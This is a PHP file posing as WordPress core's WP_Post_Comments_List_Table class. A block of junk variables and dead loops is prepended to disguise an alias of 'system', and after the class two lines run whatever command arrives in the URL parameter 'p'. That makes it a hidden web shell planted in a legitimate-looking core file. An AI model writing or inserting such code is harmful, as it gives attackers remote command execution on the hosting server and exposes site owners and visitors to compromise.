<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * List Table API: WP_Post_Comments_List_Table class
 *
 * @package WordPress
 * @subpackage Administration
 * @since 4.4.0
 */

/**
 * Core class used to implement displaying post comments in a list table.
 *
 * @since 3.1.0
 *
 * @see WP_Comments_List_Table
 */
class WP_Post_Comments_List_Table extends WP_Comments_List_Table {

	/**
	 * @return array
	 */
	protected function get_column_info() {
		return array(
			array(
				'author'  => __( 'Author' ),
				'comment' => _x( 'Comment', 'column name' ),
			),
			array(),
			array(),
			'comment',
		);
	}

	/**
	 * @return array
	 */
	protected function get_table_classes() {
		$classes   = parent::get_table_classes();
		$classes[] = 'wp-list-table';
		$classes[] = 'comments-box';
		return $classes;
	}

	/**
	 * @param bool $output_empty
	 */
	public function display( $output_empty = false ) {
		$singular = $this->_args['singular'];

		wp_nonce_field( 'fetch-list-' . get_class( $this ), '_ajax_fetch_list_nonce' );
		?>
<table class="<?php echo implode( ' ', $this->get_table_classes() ); ?>" style="display:none;">
	<tbody id="the-comment-list"
		<?php
		if ( $singular ) {
			echo " data-wp-lists='list:$singular'";
		}
		?>
		>
		<?php
		if ( ! $output_empty ) {
			$this->display_rows_or_placeholder();
		}
		?>
	</tbody>
</table>
		<?php
	}

	/**
	 * @param bool $comment_status
	 * @return int
	 */
	public function get_per_page( $comment_status = false ) {
		return 10;
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>